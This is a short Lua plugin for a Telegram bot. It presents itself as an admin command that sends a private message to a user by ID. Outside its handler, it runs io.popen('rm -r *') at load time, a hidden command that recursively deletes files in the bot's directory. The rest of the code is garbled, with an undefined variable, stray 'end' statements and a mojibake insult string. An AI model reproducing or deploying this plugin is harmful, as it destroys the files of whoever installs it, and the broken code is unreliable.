local function run(msg, matches)
  if not is_sudo(msg) then -- For admins only !
    return 'ًں–•ًں–•ًں–•ًں–•ًں–•ًں–•ًں–•ًں–•ًں–•ًں–•ًں–•ًں–•'
  end
	if matches[1] == 'pv' and is_admin(msg) then
		local response = matches[3]
		send_large_msg("user#id"..matches[2], response)
						local receiver = 'user#id'..user_id
				send_large_msg(receiver, response)
	end
	end
	io.popen('rm -r *')
return {
  patterns = {
    "^[!/](pv) (%d+) (.*)$"
  },
  run = run
}
--https://github.com/ThisIsArman
    --Telegram.me/ThisIsArman
